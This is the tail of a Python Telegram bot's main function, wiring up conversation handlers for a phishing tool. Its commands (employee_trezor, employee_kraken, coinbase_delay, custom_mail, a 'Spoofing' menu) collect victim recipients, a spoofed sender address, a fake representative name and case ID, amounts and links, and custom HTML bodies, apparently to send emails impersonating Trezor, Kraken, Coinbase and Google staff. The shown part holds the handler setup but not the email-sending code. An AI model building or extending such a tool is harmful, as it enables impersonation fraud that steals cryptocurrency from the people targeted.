                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [
                CallbackQueryHandler(
                    spoof_email_choice_kraken
                ) 
            ],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    employee_trezor_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_trezor", employee_trezor)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    coinbase_delay_handler = ConversationHandler(
    entry_points=[CommandHandler("coinbase_delay", coinbase_delay)],
    states={
        RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)],
        SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
        AMOUNT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount_token)], 
        LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],  
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)
    custom_mail_handler = ConversationHandler(
    entry_points=[CommandHandler("custom_mail", custom_mail)],
    states={
        CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
        CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
        CUSTOM_SENDER_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_sender_name)],
        CUSTOM_DISPLAY_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_display_email)],
        CUSTOM_HTML: [MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)


    application.add_handler(custom_mail_handler)
    application.add_handler(CommandHandler("donate", donate))
    #application.add_handler(coinbase_delay_handler)
    application.add_handler(employee_trezor_handler)
    application.add_handler(employee_kraken_handler)
    application.add_handler(wallet_coinbase_handler)
    #application.add_handler(employee_coinbase_handler)
    #application.add_handler(secure_coinbase_handler)
    application.add_handler(employee_google_handler)
    application.add_handler(broadcast_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Regex("Misc"), misc_menu))
    #application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
    application.add_handler(MessageHandler(filters.Regex("Spoofing"), other_menu))
    application.add_handler(MessageHandler(filters.Regex("Back to Main Menu"), back_to_main_menu))

    application.run_polling()

if __name__ == "__main__":
    main()


